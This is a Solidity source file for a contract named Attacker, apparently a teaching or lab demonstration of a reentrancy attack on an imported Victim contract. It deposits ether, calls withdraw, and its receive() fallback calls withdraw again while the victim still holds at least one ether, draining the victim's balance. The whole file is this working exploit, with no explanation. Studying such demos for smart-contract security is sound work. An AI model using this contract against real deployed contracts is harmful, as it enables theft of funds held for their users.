// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Victim.sol";

contract Attacker {
    Victim public victim;
    constructor(address payable _victim_address) {
        victim = Victim(_victim_address);
    }
    function beginAttack() external payable {
        require(msg.value >= 1 ether);
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
